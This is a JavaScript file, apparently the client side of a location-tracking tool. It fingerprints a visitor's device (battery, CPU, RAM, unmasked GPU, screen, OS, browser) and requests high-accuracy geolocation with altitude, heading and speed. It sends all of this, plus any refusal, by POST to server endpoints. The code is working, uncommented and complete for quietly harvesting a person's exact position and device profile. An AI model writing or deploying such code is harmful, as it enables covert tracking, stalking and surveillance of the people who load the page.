function information() {
  if (navigator.getBattery) {
    navigator.getBattery().then(function(battery) {
      var level = Math.round(battery.level * 100) + "%";
      var status = battery.charging ? " (Charging ⚡)" : "";
      var batteryInfo = level + status;
      collectAndSend(batteryInfo);
    });
  } else {
    collectAndSend("Unknown");
  }
}

function collectAndSend(batLevel) {
  var ptf = navigator.platform;
  var cc = navigator.hardwareConcurrency || 'Not Available';
  var ram = navigator.deviceMemory || 'Not Available';
  var ver = navigator.userAgent;
  var str = ver;
  var os = ver;

  var canvas = document.createElement('canvas');
  var gl;
  var debugInfo;
  var ven = 'Not Available';
  var ren = 'Not Available';

  try {
    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  } catch (e) {}
  if (gl) {
    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    if (debugInfo) {
      ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
      ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    }
  }

  var brw;
  if (ver.indexOf('Firefox') != -1) {
    str = str.substring(str.indexOf(' Firefox/') + 1);
    str = str.split(' ');
    brw = str[0];
  } else if (ver.indexOf('Chrome') != -1) {
    str = str.substring(str.indexOf(' Chrome/') + 1);
    str = str.split(' ');
    brw = str[0];
  } else if (ver.indexOf('Safari') != -1) {
    str = str.substring(str.indexOf(' Safari/') + 1);
    str = str.split(' ');
    brw = str[0];
  } else if (ver.indexOf('Edge') != -1) {
    str = str.substring(str.indexOf(' Edge/') + 1);
    str = str.split(' ');
    brw = str[0];
  } else {
    brw = 'Not Available';
  }

  var ht = window.screen.height;
  var wd = window.screen.width;

  os = os.substring(0, os.indexOf(')'));
  os = os.split(';');
  os = os[1];
  if (os == undefined) os = 'Not Available';
  os = os.trim();

  $.ajax({
    type: 'POST',
    url: info_file,
    data: {
      Ptf: ptf,
      Brw: brw,
      Cc: cc,
      Ram: ram,
      Ven: ven,
      Ren: ren,
      Ht: ht,
      Wd: wd,
      Os: os,
      Bat: batLevel
    },
    success: function() {},
    mimeType: 'text'
  });
}

function locate(callback, errCallback) {
  if (navigator.geolocation) {
    var optn = {
      enableHighAccuracy: true,
      timeout: 30000,
      maximumage: 0
    };
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }

  function showError(error) {
    var err_text;
    var err_status = 'failed';

    switch (error.code) {
      case error.PERMISSION_DENIED:
        err_text = 'User denied the request for Geolocation';
        break;
      case error.POSITION_UNAVAILABLE:
        err_text = 'Location information is unavailable';
        break;
      case error.TIMEOUT:
        err_text = 'The request to get user location timed out';
        break;
      case error.UNKNOWN_ERROR:
        err_text = 'An unknown error occurred';
        break;
    }

    $.ajax({
      type: 'POST',
      url: error_file,
      data: {
        Status: err_status,
        Error: err_text
      },
      success: errCallback(error, err_text),
      mimeType: 'text'
    });
  }

  function showPosition(position) {
    var lat = position.coords.latitude; 
    var lon = position.coords.longitude;
    var acc = position.coords.accuracy;
    var alt = position.coords.altitude; 
    var dir = position.coords.heading;
    var spd = position.coords.speed;

    var ok_status = 'success';

    $.ajax({
      type: 'POST',
      url: result_file,
      data: {
        Status: ok_status,
        Lat: lat,
        Lon: lon,
        Acc: acc,
        Alt: alt,
        Dir: dir,
        Spd: spd
      },
      success: callback,
      mimeType: 'text'
    });
  };
}
